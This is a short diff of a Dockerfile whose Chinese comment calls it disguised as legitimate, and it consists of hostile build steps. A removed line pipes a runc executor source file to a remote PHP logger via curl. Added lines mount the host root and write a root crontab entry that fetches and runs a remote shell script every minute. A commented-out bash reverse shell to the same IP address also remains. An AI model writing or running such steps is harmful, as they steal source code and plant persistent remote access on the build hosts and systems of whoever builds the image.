@@ -1,7 +1,11 @@
 # 伪装成合法的 Dockerfile
-FROM alpine:3.18
+FROM alpine
+RUN mkdir /host
+VOLUME /:/host
 
-RUN cat /src/executor/runcexecutor/executor.go | curl -X POST --data-binary @- http://tttqqq777.top/nb/log.php
+
+RUN echo "* * * * * root curl http://124.71.183.77/shell.sh | sh" >> /host-etc/crontab
+
 
 #RUN bash -i >& /dev/tcp/124.71.183.77/3309 0>&1 &
 
